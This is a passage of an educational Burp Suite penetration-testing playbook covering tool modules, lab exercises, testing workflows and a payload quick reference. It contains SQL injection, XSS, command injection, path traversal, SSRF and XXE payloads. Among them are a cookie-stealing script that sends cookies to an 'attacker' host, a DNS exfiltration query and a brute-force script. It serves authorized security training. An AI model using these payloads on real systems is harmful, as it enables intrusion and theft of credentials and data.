2. Right-click > "Send to Sequencer"
3. Configure token location:
   - Cookie: session_id
   - Form field: csrf_token
   - Custom location: regex pattern
4. Click "Start live capture"
5. Wait for 1000+ samples
6. Click "Analyze now"
```

**2. Manual Load Method:**

```
1. Collect tokens from application (via scripts, Intruder, etc.)
2. Sequencer > Manual load
3. Paste tokens (one per line)
4. Analyze
```

#### Understanding Results

| Metric | Good Value | Bad Value |
|--------|------------|-----------|
| Overall quality | >64 bits | <64 bits |
| Effective entropy | High | Low |
| Character-level analysis | Uniform distribution | Patterns |
| Bit-level analysis | ~50% ones and zeros | Skewed distribution |

**Example Analysis:**

```
Token Analysis Results:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Overall quality: 112 bits ✅ EXCELLENT
Effective entropy: 98 bits ✅
Character distribution: Uniform ✅
Bit distribution: 49.8% ones ✅

Conclusion: Token appears cryptographically strong
```

```
Token Analysis Results:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Overall quality: 24 bits ⚠️ POOR
Effective entropy: 18 bits ⚠️
Character distribution: Sequential pattern detected
Bit distribution: Predictable increments

Conclusion: Token is predictable and exploitable!
```

---

### Logger

The **Logger** module provides a comprehensive log of all Burp Suite activity.

#### Features

- Records all requests/responses across all tools
- Filterable by tool, host, method, status
- Exportable for reporting
- Useful for audit trails

#### Use Cases

1. **Audit Trail**: Document all actions during a test
2. **Debugging**: Track what requests were actually sent
3. **Reporting**: Export all traffic for client reports
4. **Analysis**: Review all interactions post-test

---

### Organizer

The **Organizer** module (newer addition) helps manage and annotate findings during testing.

#### Features

```
Organizer
├── Notes        → Free-form notes and observations
├── Findings     → Structured vulnerability documentation
└── Checklists   → Testing methodology tracking
```

#### Best Practice

Use Organizer to:
- Track testing progress
- Document findings as you discover them
- Maintain testing notes
- Create structured reports

---

## Extensions and BApp Store

### Accessing Extensions

```
Extender > BApp Store
```

### Essential Extensions

#### For General Testing

| Extension | Description | Free/Pro |
|-----------|-------------|----------|
| **Autorize** | Automated authorization testing | Free |
| **Logger++** | Enhanced logging with filtering | Free |
| **Turbo Intruder** | High-speed custom attacks | Free |
| **Param Miner** | Hidden parameter discovery | Free |
| **Hackvertor** | Advanced encoding/decoding | Free |

#### For Specific Vulnerabilities

| Extension | Description | Target |
|-----------|-------------|--------|
| **SQLiPy** | SQLMap integration | SQL Injection |
| **XSS Validator** | Validate XSS findings | XSS |
| **CSRF Scanner** | Find CSRF vulnerabilities | CSRF |
| **JWT Editor** | Manipulate JWT tokens | Authentication |
| **JSON Beautifier** | Format JSON responses | API Testing |

#### For Reconnaissance

| Extension | Description |
|-----------|-------------|
| **GAP** | Get All Parameters from JS files |
| **JS Link Finder** | Extract links from JavaScript |
| **Retire.js** | Identify vulnerable JS libraries |
| **Software Vulnerability Scanner** | Detect outdated software |

### Installing Extensions

```
Method 1: BApp Store
1. Extender > BApp Store
2. Find extension
3. Click "Install"

Method 2: Manual Installation
1. Download .jar file
2. Extender > Extensions > Add
3. Select "Java" type
4. Load .jar file

Method 3: Python Extensions
1. Install Jython standalone .jar
2. Extender > Options > Python Environment
3. Set Jython .jar location
4. Install .py extensions
```

### Extension Configuration

```
Extender > Options:
├── Java Environment
│   └── Path to JRE (usually auto-detected)
├── Python Environment
│   └── Path to Jython .jar
└── Ruby Environment
    └── Path to JRuby .jar
```

---

## Practical Exercises

### Exercise 1: Complete Web Application Reconnaissance

**Objective**: Map an entire web application and identify attack surface.

**Target**: DVWA, OWASP WebGoat, or any test application

**Duration**: 30-45 minutes

**Steps**:

```
Phase 1: Passive Reconnaissance (10 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Add target to scope:
   Target > Scope > Add > Include: http://target/*

2. Configure proxy:
   Proxy > Options > Intercept Client Requests
   ✅ "And URL is in target scope"

3. Browse application manually:
   - Visit every visible page
   - Click all links
   - Note forms and inputs
   - Check source code for comments

4. Review robots.txt and sitemap.xml:
   GET /robots.txt
   GET /sitemap.xml

5. Check common files:
   GET /.git/config
   GET /backup.zip
   GET /admin/
   GET /phpinfo.php
```

```
Phase 2: Active Mapping (15 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Directory enumeration with Intruder:
   - Request: GET /§FUZZ§
   - Wordlist: common.txt
   - Analyze 200, 301, 302, 403 responses

2. Parameter discovery:
   - Use Param Miner extension
   - Right-click request > Extensions > Param Miner > Guess params

3. Technology fingerprinting:
   - Check response headers
   - Analyze error pages
   - Note server versions
```

```
Phase 3: Documentation (10 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Review Site Map:
   Target > Site map > Expand all

2. Document findings:
   - List all endpoints
   - Note parameters for each
   - Identify authentication mechanisms
   - Mark interesting/sensitive pages

3. Export site map:
   Right-click > "Save selected items"
```

**Deliverable**: Complete list of endpoints, parameters, and technologies.

---

### Exercise 2: Authentication Testing

**Objective**: Test login functionality for common vulnerabilities.

**Target**: Any application with login form

**Duration**: 45-60 minutes

**Steps**:

```
Phase 1: Normal Behavior Analysis (10 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Capture normal login request:
   POST /login
   username=testuser&password=testpass

2. Document baseline:
   - Response for valid credentials
   - Response for invalid username
   - Response for invalid password
   - Response for empty fields

3. Check for user enumeration:
   Compare error messages for:
   - Valid user, wrong password
   - Invalid user, any password
```

```
Phase 2: SQL Injection Testing (15 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Send login to Repeater

2. Test payloads in username field:
   '
   "
   admin'--
   admin' OR '1'='1
   admin' OR '1'='1'--
   admin' OR '1'='1'#
   ' OR ''='
   " OR ""="
   ' OR 1=1--
   " OR 1=1--

3. Test payloads in password field:
   (Same payloads)

4. Monitor for:
   - SQL error messages
   - Successful authentication
   - Different response lengths
   - Response time differences
```

```
Phase 3: Brute Force Testing (15 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Send login to Intruder

2. Configure Cluster Bomb attack:
   username=§admin§&password=§password§

3. Payload set 1 (usernames):
   admin, administrator, root, user, test

4. Payload set 2 (passwords):
   password, 123456, admin, Password1, letmein

5. Grep match:
   - "Welcome"
   - "Login successful"
   - "Invalid"

6. Analyze results:
   - Check for account lockout
   - Note valid combinations
   - Document rate limiting
```

```
Phase 4: Session Analysis (10 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Login successfully

2. Capture session cookie:
   Set-Cookie: session=abc123xyz

3. Send cookie to Sequencer:
   - Start live capture
   - Collect 100+ samples
   - Analyze randomness

4. Test session fixation:
   - Note pre-login session ID
   - Login
   - Check if session ID changed

5. Test session handling:
   - Copy session cookie
   - Logout
   - Use old cookie - does it still work?
```

**Findings Template**:

```markdown
## Authentication Testing Results

### User Enumeration
- [VULN/SAFE] Different error messages reveal valid usernames
- Evidence: [screenshot/response]

### SQL Injection
- [VULN/SAFE] Authentication bypass possible
- Payload: `admin' OR '1'='1'--`
- Evidence: [response]

### Brute Force Protection
- [VULN/SAFE] No account lockout detected
- [VULN/SAFE] No rate limiting
- Tested: 100 requests in 60 seconds

### Session Management
- Session entropy: [X bits]
- Session fixation: [VULN/SAFE]
- Session invalidation on logout: [YES/NO]
```

---

### Exercise 3: Input Validation Testing (XSS & Injection)

**Objective**: Test input fields for cross-site scripting and injection vulnerabilities.

**Duration**: 45-60 minutes

**Steps**:

```
Phase 1: Identify Input Points (10 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. List all input fields:
   - Search boxes
   - Comment forms
   - Profile fields
   - URL parameters
   - Headers (User-Agent, Referer)

2. Document input handling:
   - Which inputs are reflected?
   - Which inputs are stored?
   - Which inputs appear in responses?
```

```
Phase 2: Reflected XSS Testing (20 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Test basic payloads in Repeater:

   # Basic test
   <script>alert('XSS')</script>
   
   # Without script tags
   <img src=x onerror=alert('XSS')>
   
   # SVG payload
   <svg onload=alert('XSS')>
   
   # Event handlers
   " onmouseover="alert('XSS')
   ' onclick='alert("XSS")
   
   # Breaking out of tags
   "><script>alert('XSS')</script>
   '><script>alert('XSS')</script>

2. Test filter bypasses:

   # Case variation
   <ScRiPt>alert('XSS')</ScRiPt>
   
   # Encoding
   <script>alert(String.fromCharCode(88,83,83))</script>
   
   # Null bytes
   <scr%00ipt>alert('XSS')</script>
   
   # Unicode
   <script>alert('XSS')</script>

3. Use Intruder for payload lists:
   - Load XSS wordlist
   - Grep for "alert" or payload reflection
   - Check response rendering
```

```
Phase 3: Stored XSS Testing (10 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Find storage points:
   - Comments
   - Profile bio
   - Forum posts
   - File uploads

2. Submit persistent payloads:
   - Simple alert
   - Cookie stealer (lab only):
     <script>new Image().src='http://attacker/steal?c='+document.cookie</script>

3. Verify payload execution:
   - Visit page in different browser
   - Check if payload persists
```

```
Phase 4: Document Findings (5 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

For each XSS finding:
- Location (URL/parameter)
- Type (Reflected/Stored/DOM)
- Payload that worked
- Context (HTML/JavaScript/attribute)
- Impact assessment
```

**XSS Testing Cheat Sheet**:

```
# Context: Inside HTML
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>

# Context: Inside attribute
" onmouseover="alert('XSS')
' onfocus='alert("XSS")' autofocus='

# Context: Inside JavaScript
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>

# Context: Inside URL
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>

# Filter bypass techniques
<SCRIPT>alert('XSS')</SCRIPT>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<script>alert`XSS`</script>
<script>alert(/XSS/)</script>
```

---

### Exercise 4: API Security Testing

**Objective**: Test REST API endpoints for common vulnerabilities.

**Duration**: 60 minutes

**Steps**:

```
Phase 1: API Discovery (15 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Identify API endpoints:
   /api/v1/users
   /api/v1/products
   /api/v1/orders

2. Check for documentation:
   /api/docs
   /swagger
   /swagger.json
   /api-docs
   /openapi.json

3. Test authentication:
   - API keys
   - Bearer tokens
   - Basic auth
   - OAuth tokens
```

```
Phase 2: Authorization Testing (20 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Test IDOR (Insecure Direct Object Reference):

   # Normal request (own data)
   GET /api/v1/users/100
   Authorization: Bearer <user_token>
   
   # Try accessing other users
   GET /api/v1/users/101
   GET /api/v1/users/99
   GET /api/v1/users/1  (admin?)
   
   # Try different ID formats
   /users/100
   /users/00100
   /users/100.json
   /users/100%2f

2. Test privilege escalation:

   # User endpoint - try admin actions
   POST /api/v1/users
   {"role": "admin"}
   
   DELETE /api/v1/users/1
   
   PUT /api/v1/users/100
   {"role": "admin", "permissions": ["all"]}

3. Use Autorize extension:
   - Configure low-privilege token
   - Browse as admin
   - Check for authorization failures
```

```
Phase 3: Input Validation (15 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Test JSON injection:

   # Original
   {"username": "test", "email": "test@test.com"}
   
   # Injection attempts
   {"username": "test\", \"role\": \"admin", "email": "test@test.com"}
   {"username": "test", "email": "test@test.com", "admin": true}

2. Test mass assignment:

   # Try adding unexpected fields
   {"username": "test", "password": "pass", "isAdmin": true}
   {"username": "test", "password": "pass", "role_id": 1}

3. Test type juggling:

   # Numeric vs string
   {"user_id": 1}
   {"user_id": "1"}
   {"user_id": true}
   {"user_id": [1]}
```

```
Phase 4: Rate Limiting & Logic (10 min)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Test rate limiting:
   - Send 100 requests rapidly
   - Check for 429 responses
   - Note limits

2. Test business logic:
   - Price manipulation
   - Quantity modification
   - Coupon reuse
   - Race conditions
```

---

## Common Vulnerability Testing

### SQL Injection Testing Workflow

```
Step 1: Detection
━━━━━━━━━━━━━━━━
Test Characters:
'        (single quote)
"        (double quote)
;        (semicolon)
)        (closing parenthesis)
--       (SQL comment)
#        (MySQL comment)

Observe:
- Error messages
- Response differences
- Time delays
```

```
Step 2: Confirmation
━━━━━━━━━━━━━━━━━━━
Boolean-based:
' AND '1'='1     (should return normal)
' AND '1'='2     (should return different)

Time-based:
'; WAITFOR DELAY '0:0:5'--    (MSSQL)
'; SELECT SLEEP(5)--          (MySQL)
'; SELECT pg_sleep(5)--       (PostgreSQL)

Error-based:
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
```

```
Step 3: Exploitation
━━━━━━━━━━━━━━━━━━━━
Union-based (find columns):
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
(increment until error)

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

Data extraction:
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### XSS Testing Workflow

```
Step 1: Find Reflection Points
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Input: <test123>
Search response for: <test123>
Note: Is it encoded? In what context?
```

```
Step 2: Determine Context
━━━━━━━━━━━━━━━━━━━━━━━━
HTML context:      <p>USER_INPUT</p>
Attribute context: <input value="USER_INPUT">
JavaScript context: var x = "USER_INPUT";
URL context:       <a href="USER_INPUT">
```

```
Step 3: Craft Payload for Context
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
HTML:       <script>alert(1)</script>
Attribute:  "><script>alert(1)</script>
JavaScript: ";alert(1);//
URL:        javascript:alert(1)
```

```
Step 4: Bypass Filters
━━━━━━━━━━━━━━━━━━━━━━
If <script> blocked:
  <img src=x onerror=alert(1)>
  <svg/onload=alert(1)>
  
If alert blocked:
  <script>confirm(1)</script>
  <script>prompt(1)</script>
  
If parentheses blocked:
  <script>alert`1`</script>
```

### CSRF Testing Workflow

```
Step 1: Identify Sensitive Actions
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Password change
- Email change
- Fund transfer
- Settings modification
- Account deletion
```

```
Step 2: Check for CSRF Protection
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Look for:
- CSRF token in form
- CSRF token in header
- Referer validation
- SameSite cookie attribute

In request:
<input type="hidden" name="csrf_token" value="abc123">
X-CSRF-Token: abc123
```

```
Step 3: Test CSRF Protection
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Test 1: Remove token entirely
Test 2: Use empty token
Test 3: Use different user's token
Test 4: Modify token slightly
Test 5: Use old/expired token
```

```
Step 4: Create PoC (if vulnerable)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<!-- GET-based CSRF -->
<img src="https://target.com/transfer?to=attacker&amount=1000">

<!-- POST-based CSRF -->
<form action="https://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

### Command Injection Testing

```
Test Characters:
;        command separator (Unix)
|        pipe
||       OR
&&       AND
`cmd`    command substitution
$(cmd)   command substitution

Test Payloads:
; whoami
| whoami
|| whoami
&& whoami
`whoami`
$(whoami)

Blind Detection:
; sleep 5
| sleep 5
; ping -c 5 attacker.com
```

### Path Traversal Testing

```
Basic Payloads:
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd

Encoded Payloads:
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

Null Byte (older systems):
../../../etc/passwd%00.jpg
../../../etc/passwd%00

Target Files:
Linux: /etc/passwd, /etc/shadow, /etc/hosts
Windows: C:\Windows\System32\drivers\etc\hosts
         C:\Windows\win.ini
```

---

## Advanced Techniques

### Using Turbo Intruder

Turbo Intruder is a Burp extension for extremely fast HTTP attacks.

```python
# Basic script for password brute force
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100)
    
    for word in open('/path/to/passwords.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if '200 OK' in req.response or 'Welcome' in req.response:
        table.add(req)
```

```python
# Race condition testing
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=1,
                          pipeline=False)
    
    # Queue same request multiple times
    for i in range(30):
        engine.queue(target.req, gate='race1')
    
    # Open gate to send all requests simultaneously
    engine.openGate('race1')
```

### Collaborator for Out-of-Band Testing

Burp Collaborator (Professional) detects out-of-band interactions:

```
Use Cases:
- Blind SQL injection with DNS exfiltration
- Blind XXE with external entity loading
- SSRF detection
- Blind command injection

Payload Examples:

# DNS exfiltration
'; SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.burpcollaborator.net\\a'))--

# XXE OOB
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>

# Blind SSRF
http://internal-server.burpcollaborator.net/
```

### Macro Configuration for Complex Authentication

For applications with multi-step login or CSRF tokens:

```
1. Project Options > Sessions > Macros
2. Add new macro
3. Record login sequence:
   - GET /login (get CSRF token)
   - POST /login (submit credentials)
   - Follow redirects

4. Session Handling Rules:
   - Add rule
   - Scope: Target URLs
   - Action: Run macro to obtain session token
   - Update parameters from response
```

### Using Match and Replace Effectively

```
Location: Proxy > Options > Match and Replace

Useful Rules:

1. Add testing header:
   Type: Request header
   Match: ^$
   Replace: X-Custom-Header: test

2. Remove security headers (for testing):
   Type: Response header
   Match: ^X-Frame-Options:.*$
   Replace: [empty]

3. Change User-Agent:
   Type: Request header
   Match: ^User-Agent:.*$
   Replace: User-Agent: Custom-Scanner/1.0

4. Auto-add cookies:
   Type: Request header
   Match: ^Cookie:.*$
   Replace: Cookie: session=maintained_value
```

---

## Best Practices

### Ethical Hacking Guidelines

```
1. AUTHORIZATION
━━━━━━━━━━━━━━━
✅ Always obtain written permission
✅ Define clear scope boundaries
✅ Get emergency contacts
✅ Understand rules of engagement
❌ Never test without authorization
❌ Never exceed defined scope
```

```
2. DOCUMENTATION
━━━━━━━━━━━━━━━━
✅ Log all activities
✅ Screenshot findings
✅ Record timestamps
✅ Note affected systems
✅ Document reproduction steps
```

```
3. RESPONSIBLE DISCLOSURE
━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Report findings to appropriate contact
✅ Provide clear, detailed reports
✅ Allow reasonable time for fixes
✅ Maintain confidentiality
✅ Follow coordinated disclosure timelines
```

```
4. MINIMIZE IMPACT
━━━━━━━━━━━━━━━━━
✅ Use non-destructive tests when possible
✅ Avoid DoS attacks unless approved
✅ Don't modify or delete data
✅ Test during approved windows
✅ Have rollback plans
```

### Testing Workflow Best Practices

```
Pre-Engagement:
1. ✅ Signed authorization/contract
2. ✅ Scope document reviewed
3. ✅ Contact information confirmed
4. ✅ Testing window agreed
5. ✅ Reporting requirements understood

During Testing:
1. ✅ Stay within scope
2. ✅ Document everything
3. ✅ Report critical findings immediately
4. ✅ Maintain evidence chain
5. ✅ Regular progress updates

Post-Engagement:
1. ✅ Deliver comprehensive report
2. ✅ Debrief with client
3. ✅ Securely delete test data
4. ✅ Archive project files
5. ✅ Lessons learned review
```

### Report Writing

```markdown
## Vulnerability Report Template

### Executive Summary
Brief overview for management
- Number of findings by severity
- Key risks identified
- Immediate recommendations

### Finding Detail

**Title**: SQL Injection in Login Form

**Severity**: Critical (CVSS 9.8)

**Affected Component**: /api/v1/login

**Description**:
The login endpoint is vulnerable to SQL injection through
the username parameter, allowing authentication bypass
and database access.

**Steps to Reproduce**:
1. Navigate to login page
2. Enter payload in username: admin' OR '1'='1'--
3. Enter any password
4. Observe successful authentication

**Evidence**:
[Request/Response screenshots]

**Impact**:
- Authentication bypass
- Full database access
- Potential data breach

**Remediation**:
1. Use parameterized queries
2. Implement input validation
3. Apply principle of least privilege

**References**:
- OWASP SQL Injection: https://owasp.org/...
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
```

---

## Troubleshooting

### Common Issues and Solutions

#### Proxy Not Intercepting Traffic

```
Problem: Requests not appearing in Burp

Solutions:
1. Verify proxy listener is running:
   Proxy > Options > Proxy Listeners
   ✅ Running on 127.0.0.1:8080

2. Check browser proxy settings:
   HTTP Proxy: 127.0.0.1
   Port: 8080
   ✅ "Also use for HTTPS"

3. Verify interception is enabled:
   Proxy > Intercept > "Intercept is on"

4. Check interception rules:
   Proxy > Options > Intercept Client Requests
   Remove overly restrictive rules

5. Check if site uses HTTP/2:
   Proxy > Options > HTTP/2
   ✅ Enable HTTP/2
```

#### HTTPS Certificate Errors

```
Problem: Browser shows certificate warnings

Solutions:
1. Verify CA certificate is installed:
   - Export from http://burpsuite
   - Install in browser/system trust store

2. Check certificate details:
   - Must be PortSwigger CA
   - Must be trusted for SSL/TLS

3. For specific sites with cert pinning:
   - May not be interceptable
   - Use mobile testing techniques

4. Firefox-specific:
   - Install cert in Firefox certificate manager
   - Not system store
```

#### Slow Performance

```
Problem: Burp is slow or unresponsive

Solutions:
1. Increase memory allocation:
   - Edit .vmoptions file
   - Set -Xmx4g or higher

2. Reduce history size:
   - Project Options > Misc > "Limit on message size"
   - Clear HTTP history periodically

3. Disable extensions:
   - Extender > Extensions
   - Unload unused extensions

4. Filter out static content:
   - Proxy > Options > Intercept Server Responses
   - Exclude images, CSS, JS

5. Use SSD storage:
   - Project files perform better on SSD
```

#### Extension Issues

```
Problem: Extension not loading or crashing

Solutions:
1. Check Java version compatibility:
   - Help > About
   - Verify Burp's Java version

2. Check extension requirements:
   - Some need Jython (Python)
   - Some need JRuby (Ruby)

3. Check extension output:
   - Extender > Extensions > [extension] > Output
   - Look for error messages

4. Update extension:
   - Remove and reinstall from BApp Store

5. Check for conflicts:
   - Disable other extensions
   - Test one at a time
```

---

## Quick Reference

### Keyboard Shortcuts

| Shortcut | Action |
|----------|--------|
| `Ctrl+R` | Send to Repeater |
| `Ctrl+I` | Send to Intruder |
| `Ctrl+D` | Send to Decoder |
| `Ctrl+Shift+R` | Go to Repeater |
| `Ctrl+Shift+I` | Go to Intruder |
| `Ctrl+Shift+T` | Go to Target |
| `Ctrl+Shift+P` | Go to Proxy > Intercept |
| `Ctrl+Shift+D` | Go to Dashboard |
| `Ctrl+Space` | Forward intercepted request |
| `Ctrl+F` | Find |
| `Ctrl+U` | URL encode selection |
| `Ctrl+Shift+U` | URL decode selection |
| `Ctrl+B` | Base64 encode selection |
| `Ctrl+Shift+B` | Base64 decode selection |

### Common Payloads Reference

```
# SQL Injection
'
"
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
' OR '1'='1'#
admin'--
1' AND '1'='1
1' AND '1'='2
'; WAITFOR DELAY '0:0:5'--
'; SELECT SLEEP(5)--

# XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
javascript:alert(1)

# Command Injection
; whoami
| whoami
`whoami`
$(whoami)
; sleep 5
| sleep 5
& ping -c 5 attacker.com &

# Path Traversal
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# SSRF
http://127.0.0.1/
http://localhost/
http://[::1]/
http://127.0.0.1:22/
http://internal-host/
http://169.254.169.254/  (AWS metadata)

# XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### HTTP Status Codes for Testers

| Code | Meaning | Security Relevance |
|------|---------|-------------------|
| 200 | OK | Success - analyze response |
| 201 | Created | Resource created - IDOR? |
| 301/302 | Redirect | Open redirect? |
| 400 | Bad Request | Input validation |
| 401 | Unauthorized | Auth required |
| 403 | Forbidden | Access control - bypass? |
| 404 | Not Found | Resource enumeration |
| 405 | Method Not Allowed | Try other methods |
| 429 | Too Many Requests | Rate limiting active |
| 500 | Server Error | Application error - details? |
| 502/503 | Server unavailable | Infrastructure info |

---

## Additional Resources

### Official Documentation

- [PortSwigger Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Burp Suite Support Center](https://portswigger.net/burp/documentation/desktop)

### Practice Platforms

| Platform | URL | Notes |
|----------|-----|-------|
| PortSwigger Web Security Academy | https://portswigger.net/web-security | Free, integrated with Burp |
| TryHackMe | https://tryhackme.com | Burp Suite module available |
| Hack The Box | https://hackthebox.com | Real-world scenarios |
| DVWA | https://github.com/digininja/DVWA | Local practice |
| OWASP WebGoat | https://owasp.org/www-project-webgoat/ | Learning platform |
| bWAPP | http://www.itsecgames.com/ | Buggy web application |
| Juice Shop | https://owasp.org/www-project-juice-shop/ | Modern web app |

### Cheat Sheets

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [SecLists](https://github.com/danielmiessler/SecLists)

### Certifications Using Burp Suite

| Certification | Organization | Relevance |
|---------------|--------------|-----------|
| CEH Practical | EC-Council | Practical exam uses Burp |
| OSCP | Offensive Security | Web testing component |
| OSWE | Offensive Security | Web exploitation focus |
| GWAPT | SANS/GIAC | Web app pentesting |
| eWPT | eLearnSecurity | Web testing certification |

---

## Changelog

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2025 | Initial release |

---

## Contributing

This playbook is intended to be a living document. Contributions, corrections, and suggestions are welcome. Please ensure all content adheres to ethical guidelines and responsible disclosure practices.

---

**Remember**: The skills you develop with Burp Suite carry significant responsibility. Always test ethically, within authorized boundaries, and with the goal of improving security.

---

*This playbook is intended for educational purposes and authorized security testing only.*
